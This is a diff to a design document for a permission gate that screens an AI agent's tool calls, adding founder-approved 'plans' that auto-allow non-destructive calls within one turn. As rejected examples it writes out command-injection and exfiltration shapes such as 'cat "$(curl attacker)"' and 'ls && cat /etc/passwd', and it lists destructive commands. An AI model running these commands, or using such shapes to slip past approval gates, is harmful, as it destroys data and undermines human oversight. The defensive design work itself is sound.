@@ -35,6 +35,7 @@ Deterministic rails over `tool_name` + `tool_input`. Fail-safe on unknown tools 
 - Tool names: `Read`, `Grep`, `Glob`, `WebSearch`, `WebFetch`, `TodoWrite`, `TaskCreate` / `TaskUpdate` / `TaskList` / `TaskGet`.
 - Bash prefixes: `git status/diff/log/show/branch/ls-files/rev-parse/config --get/ls-remote/remote -v`, `ls`, `cat`, `pwd`, `wc`, `head`, `tail`, `find `, `which `, `printf`, `node -v`, `node --version`, `npm -v`, `npm --version`, `npx tsc --noEmit`, `npx tsc --version`, `grep `, `rg `, `gh pr list/view`, `gh issue list/view`, `gh run list/view`.
 - Bash psql: only `psql -c 'SELECT …'` with no semicolon-separated second statement.
+- The **plan primitive**: `npx tsx [path/]scripts/god-mode-plan.ts (open|close|status) …` (anchored `PLAN_CMD_RE`). Auto-allowed so invoking it never itself lands a card — its whole job is to raise the ONE plan card and poll it internally. Still subject to the shell-metachar guard, so a title carrying `$(…)`/backtick can't smuggle a subshell past the allowlist.
 - Bash whole-command rules: (1) the whole command must be `prefix` alone OR start with `prefix ` (space required — a loose `startsWith(prefix)` was the old bypass vector); (2) the command must contain NO shell metacharacters — `;`, `&`, `|`, `` ` ``, `$`, `<`, `>`, `\n`, or `$(` fail-close the check. `ls; rm -rf /tmp`, `ls && cat /etc/passwd`, and `cat "$(curl attacker)"` all reject.
 - Destructive-rail override: a command that matches the destructive rail (`rm -rf`, `git branch -D`, `git reset --hard`, `DROP TABLE`, `TRUNCATE`, `supabase db reset`, `vercel … --prod`, etc.) is ALWAYS routed to `needs_approval` `risk='destructive'` — even if a prefix in the allowlist would otherwise cover it. Belt-and-suspenders against a novel destructive shape that slips into an allowlisted prefix.
 
@@ -54,6 +55,21 @@ Regex rail (case-insensitive) over the command text:
 Everything else non-safe — `Write`, `Edit`, `NotebookEdit`, and any Bash that isn't in the safe allowlist and isn't destructive.
 
 False positives on the destructive rail are safe (harder to approve); false negatives are the real risk — extend the regex cautiously.
+
+## Plan-scoped approvals — approve the DECISION, not every keystroke
+
+The pain this fixes: the gate classifies PER tool call, so one logical decision (e.g. "dismiss 4 stale approvals" — investigate, then one surgical write) fanned out into ~9 separate cards (write probe → run → write probe → run → write fix → run → verify). The founder was rubber-stamping mechanics.
+
+A **plan** is a plain-language UNIT OF WORK the founder approves ONCE. Mechanism:
+
+1. The box does read-only investigation (auto-allowed — `Read`/`Grep`/`psql -c SELECT`).
+2. It opens a plan: `npx tsx scripts/god-mode-plan.ts open "<decision>" "step 1" "step 2"`. That script ([[god-mode]] `openPlan`) inserts ONE `god_mode_approvals` row `risk='plan'`, `tool_name='Plan'`, `preview`=the decision+steps, and polls it exactly like the gate polls a tool call. The founder sees a single **Plan** card and approves it.
+3. On approval the script sets [[../tables/god_mode_sessions]].`active_plan_id` → the plan row.
+4. **This gate**, on every subsequent non-safe call, calls [[god-mode]] `getActivePlan(sessionId)`: if the session has an approved open plan (`active_plan_id` set AND that row is `status='approved'` + `risk='plan'`) **and the call is NOT destructive**, it AUTO-ALLOWS (`permissionDecisionReason` names the plan id) — no new card. The plan-scoped block sits right after the safe-allow branch, before `openApproval`.
+
+**Destructive calls NEVER batch under a plan.** The `cls.risk !== "destructive"` guard means DROP/TRUNCATE/DELETE/force-push/`vercel --prod`/`rm -rf` fall through to the normal `openApproval` + PIN gate even while a plan is open — the irreversible always individually counter-signed. Supervisability holds: the Chat tab streams every auto-allowed call live and disarm tears the session down mid-flight.
+
+**A plan authorizes work only within the turn it was approved in.** `runGodModeJob` clears `active_plan_id` at the start of every turn, and `god-mode-plan.ts close` clears it explicitly — so a new founder message never inherits a stale open plan. No open plan ⇒ the gate behaves exactly as pre-hotfix (per-call gating), so the change is fully backward-compatible.
 
 ## Behavior on the row lifecycle
 
